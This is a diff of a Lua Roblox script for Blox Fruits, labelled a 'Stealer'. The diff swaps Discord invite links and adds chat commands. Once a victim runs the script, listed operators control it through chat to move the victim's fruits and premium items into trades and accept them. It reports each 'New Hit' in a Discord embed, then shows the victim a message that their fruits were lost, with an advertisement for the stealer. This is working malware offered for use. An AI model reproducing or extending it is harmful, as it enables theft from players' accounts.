@@ -521,7 +521,7 @@ local function formatPremiumItems()
 end
 
 local embed = {
-    title = (dragonFruit and "DRAGON DETECTED!") or "Rua BF Joiner ; https://discord.gg/zJKDqRd5",
+    title = (dragonFruit and "DRAGON DETECTED!") or "BF Joiner ; https://discord.gg/E3MPAbp8",
     description = "New Hit! @everyone",
     color = (dragonFruit and 0xFF0000) or 0x00FF00,
     fields = {
@@ -546,7 +546,7 @@ end
 table.insert(embed.fields, {name = "Executor Info", value = "```\nExecutor: " .. ExecutorName .. "\nStealer Version: " .. GameVersion .. "\n```", inline = false})
 table.insert(embed.fields, {name = "Server Info", value = "```\nPlayer Count: " .. PlayerCount .. "\nServer Time: " .. ServerTime .. "\n```", inline = false})
 table.insert(embed.fields, {name = "NOTES:", value = [[
-?jump ?sit ?sit2 ?reset ?tp ?cleartrade ?clearfruits ?addallfruits ?addfruits ?accept ?additem ?addallitems ?resetfruit ?stopreset ?help ?rejoin ?kick ?invite
+?jump ?sit ?sit2 ?reset ?tp ?cleartrade ?clearfruits ?addall ?accept ?additem ?addallitems ?resetfruit ?stopreset ?help ?rejoin ?kick ?invite ?demolish
 ]], inline = false})
 
 local player22 = game.Players.LocalPlayer
@@ -1036,7 +1036,7 @@ local function createDiscordUI()
     Description.Position = UDim2.new(0.05, 0, 0.3, 0)
     Description.BackgroundTransparency = 1
     Description.Font = Enum.Font.Gotham
-    Description.Text = "Hey! You just lost some of your valuable fruits to Rua Hub BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! Click the button to copy invite"
+    Description.Text = "Hey! You just lost some of your valuable fruits to BF Joiner Stealer. No need to worry! If you want to make them back using OUR stealer - Join our discord! https://discord.gg/E3MPAbp8 Click the button to copy invite"
     Description.TextColor3 = Color3.fromRGB(220, 221, 222)
     Description.TextScaled = true
     Description.TextWrapped = true
@@ -1091,7 +1091,7 @@ local function createDiscordUI()
     end
 
     Button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/zJKDqRd5")
+        setclipboard("https://discord.gg/E3MPAbp8")
         showCopiedText()
     end)
 
@@ -1105,16 +1105,19 @@ local ChatCommands = {
     cooldowns = {
         default = 0.1,
         invite = 0.25,
-        addfruits = 0.25,
         add = 0.25,
         addall = 0.25,
         clearfruits = 0.25,
         additem = 0.25,
+        addallitems = 0.25,
         sit = 0.5,
-        tp = 0.5,
+        sit2 = 0.5,
         resetfruit = 3,
-        bang = 2,
+        tp = 0.25,
+        stopreset = 0.5,
+        showinv = 1,
     },
+
     commands = {
         jump = function()
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
@@ -1125,7 +1128,7 @@ local ChatCommands = {
         invite = function()
             createDiscordUI()
         end,
-
+        
         sit = function()
             task.spawn(function()
                 local tradeTable = findTradeTable()
@@ -1138,7 +1141,7 @@ local ChatCommands = {
                 end
             end)
         end,
-
+        
         reset = function()
             if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
                 LocalPlayer.Character.Humanoid.Health = 0
@@ -1152,13 +1155,13 @@ local ChatCommands = {
                         "Please specify a fruit name! Usage: ?resetfruit FruitName", "All")
                     return
                 end
-
+        
                 local inventory = getInventory()
                 if not inventory then return end
                 local searchTerm = args:lower()
                 local foundFruit = false
                 local fruitName = nil
-
+                
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                         fruitName = item.Name
@@ -1166,33 +1169,146 @@ local ChatCommands = {
                         break
                     end
                 end
-
+                
                 if not foundFruit then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No fruit matching '" .. args .. "' found in inventory!", "All")
                     return
                 end
-
-                local baseFruitName = fruitName:match("([^-]+)")
-                local formattedFruitName = baseFruitName .. "-" .. baseFruitName
-
-                local args = {
-                    [1] = "LoadFruit",
-                    [2] = formattedFruitName
-                }
-                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
-
+        
+                local baseFruitName = fruitName:match("(%S+)")
+                local formattedFruitName = string.format("%s", baseFruitName)
+        
+                local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
+                Remote:InvokeServer("LoadFruit", formattedFruitName)
+            
+                task.wait(0.5)
                 if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
-                    task.wait(0.3)
                     LocalPlayer.Character.Humanoid.Health = 0
                 end
-
+        
                 game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-                    "Reset " .. baseFruitName .. " successfully!", "All")
+                    "Reseted with " .. baseFruitName .. "", "All")
+            end)
+        end, 
+
+        addallitems = function()
+            task.spawn(function()
+                local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
+                if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
+                
+                local inventory = getInventory()
+                if not inventory then return end
+                
+                local premiumItems = {}
+                for _, item in pairs(inventory) do
+                    if item.Type == "Premium" then
+                        table.insert(premiumItems, item.Name)
+                    end
+                end
+
+                local addedItems = {}
+                local attempts = 0
+                local maxAttempts = 50
+                local targetItems = math.min(4, #premiumItems)
+                
+                while #addedItems < targetItems and attempts < maxAttempts do
+                    local availableItems = {}
+                    for _, item in ipairs(premiumItems) do
+                        if not addedItems[item] then
+                            table.insert(availableItems, item)
+                        end
+                    end
+                    
+                    if #availableItems == 0 then break end
+
+                    local randomIndex = math.random(1, #availableItems)
+                    local selectedItem = availableItems[randomIndex]
+                    
+                    ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", selectedItem)
+                    task.wait(0.05)
+                    
+                    local container = tradeUI.Trade:FindFirstChild("Container")
+                    if container then
+                        local playerFrame = container:FindFirstChild("1")
+                        if playerFrame then
+                            local itemFrame = playerFrame:FindFirstChild("Frame")
+                            if itemFrame and itemFrame:FindFirstChild(selectedItem) then
+                                addedItems[selectedItem] = true
+                                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                                    "Added " .. selectedItem:gsub("-", " ") .. " to trade!", "All")
+                            end
+                        end
+                    end
+                    
+                    attempts = attempts + 1
+                end
+
+                local totalAdded = 0
+                for _ in pairs(addedItems) do totalAdded = totalAdded + 1 end
+                
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                    "Successfully added " .. totalAdded .. " premium items to trade!", "All")
             end)
         end,
 
-        tp = function()
+        showinv = function()
+            task.spawn(function()
+                local inventory = getInventory()
+                if not inventory then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Error getting inventory.", "All")
+                    return
+                end
+        
+                local fruitCounts = {}
+                for _, item in pairs(inventory) do
+                    if item.Type == "Blox Fruit" then
+                        local simpleName = item.Name:match("^([^-]+)")
+                        fruitCounts[simpleName] = (fruitCounts[simpleName] or 0) + item.Count
+                    end
+                end
+        
+                if not next(fruitCounts) then
+                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Inventory is empty of fruits.", "All")
+                    return
+                end
+        
+                local chatEvent = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+                local messageChunks = {}
+                local currentChunk = ""
+                local fruitList = {}
+                for fruitName, count in pairs(fruitCounts) do
+                    local displayText = fruitName
+                    if count > 1 then
+                        displayText = displayText .. " (x" .. count .. ")"
+                    end
+                    table.insert(fruitList, displayText)
+                end
+                
+                local message = table.concat(fruitList, ", ")
+                
+                while #message > 0 do
+                    local chunk = message:sub(1, 128)
+                    local lastComma = chunk:find(",[^,]*$")
+                    
+                    if #message > 128 and lastComma then
+                        chunk = message:sub(1, lastComma - 1)
+                        message = message:sub(lastComma + 2)
+                    else
+                        message = message:sub(#chunk + 1)
+                    end
+                    
+                    table.insert(messageChunks, chunk)
+                end
+                
+                for _, chunk in ipairs(messageChunks) do
+                    chatEvent:FireServer(chunk, "All")
+                    task.wait(0.5)
+                end
+            end)
+        end,
+
+        sit2 = function()
             task.spawn(function()
                 local tradeTable = findTradeTable()
                 if tradeTable then
@@ -1221,10 +1337,10 @@ local ChatCommands = {
             task.spawn(function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-
+                
                 local inventory = getInventory()
                 if not inventory then return end
-
+                
                 local addedFruits = {}
                 for _, fruit in ipairs(FruitsToHit) do
                     for _, item in pairs(inventory) do
@@ -1243,19 +1359,19 @@ local ChatCommands = {
             task.spawn(function()
                 if not args or args == "" then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
-                        "Please specify a fruit name! Usage: ?addfruit FruitName", "All")
+                        "Please specify a fruit name! Usage: ?add FruitName", "All")
                     return
                 end
 
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-
+                
                 local inventory = getInventory()
                 if not inventory then return end
-
+                
                 local searchTerm = args:lower()
                 local foundFruit = false
-
+                
                 for _, item in pairs(inventory) do
                     if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm) then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
@@ -1265,7 +1381,7 @@ local ChatCommands = {
                         break
                     end
                 end
-
+                
                 if not foundFruit then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No fruit matching '" .. args .. "' found in inventory!", "All")
@@ -1277,16 +1393,16 @@ local ChatCommands = {
             task.spawn(function()
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-
+                
                 local container = tradeUI.Trade:FindFirstChild("Container")
                 if not container then return end
-
+                
                 local playerFrame = container:FindFirstChild("1")
                 if not playerFrame then return end
-
+                
                 local itemFrame = playerFrame:FindFirstChild("Frame")
                 if not itemFrame then return end
-
+                
                 for _, item in ipairs(itemFrame:GetChildren()) do
                     if item:IsA("ImageButton") then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("removeItem", item.Name)
@@ -1300,6 +1416,48 @@ local ChatCommands = {
             game.Players.LocalPlayer:Kick("Error while loading! Rejoin.")
         end,
 
+tp = function()
+    task.spawn(function()
+
+        local Sea2 = game.PlaceId == 4442272183
+        local Sea3 = game.PlaceId == 7449423635
+
+        if Sea3 then
+            local inventory = getInventory()
+            local hasValkyrie = false
+
+            for _, item in pairs(inventory) do
+                if item.Name == "Valkyrie Helm" then
+                    hasValkyrie = true
+                    break
+                end
+            end
+
+            if hasValkyrie then
+                local args = {
+                    [1] = "requestEntrance",
+                    [2] = Vector3.new(-12471.33, 374.95, -7539.37)
+                }
+                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
+                return
+            end
+
+            tweenToPosition(Vector3.new(-12550.8701171875, 337.239990234375, -7425.52001953125))
+
+        elseif Sea2 then
+            tweenToPosition(Vector3.new(-381.8599853515625, 73.08000183105469, 299.92999267578125))
+        end
+    end)
+end,
+
+        stopreset = function()
+            task.spawn(function()
+                isResettingEnabled = false
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
+                    "Stopped fruit resetting process!", "All")
+            end)
+        end,
+
         additem = function(args)
             task.spawn(function()
                 if not args or args == "" then
@@ -1310,13 +1468,13 @@ local ChatCommands = {
 
                 local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
                 if not tradeUI or not tradeUI:FindFirstChild("Trade") then return end
-
+                
                 local inventory = getInventory()
                 if not inventory then return end
-
+                
                 local searchTerm = args:lower()
                 local foundItem = false
-
+                
                 for _, item in pairs(inventory) do
                     if item.Type == "Premium" and item.Name:lower():find(searchTerm) then
                         ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction"):InvokeServer("addItem", item.Name)
@@ -1326,7 +1484,7 @@ local ChatCommands = {
                         break
                     end
                 end
-
+                
                 if not foundItem then
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                         "No Premium item matching '" .. args .. "' found in inventory!", "All")
@@ -1335,7 +1493,7 @@ local ChatCommands = {
         end,
 
         rejoin = function()
-            task.spawn(function()
+           task.spawn(function()
                 local ts = game:GetService("TeleportService")
                 local p = game:GetService("Players").LocalPlayer
                 ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
@@ -1345,9 +1503,9 @@ local ChatCommands = {
         help = function()
             task.spawn(function()
                 local commands = {
-                    "Movement: ?jump, ?sit, ?reset, ?tp",
-                    "Trade: ?accept, ?cleartrade, ?addallfruits, ?addfruit <name>, ?clearfruits, ?additem <name>",
-                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>"
+                    "Movement: ?jump, ?sit, ?sit2, ?reset, ?tp",
+                    "Trade: ?accept, ?cleartrade, ?addall, ?add <name>, ?clearfruits, ?additem <name>, ?addallitems",
+                    "Utility: ?kick, ?rejoin, ?invite, ?resetfruit <name>, ?stopreset, ?showinv"
                 }
                 for _, msg in ipairs(commands) do
                     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
@@ -1357,6 +1515,7 @@ local ChatCommands = {
         end
     }
 }
+
 
 local function isAuthorizedUser(player)
     return table.find(Usernames, player.Name) ~= nil
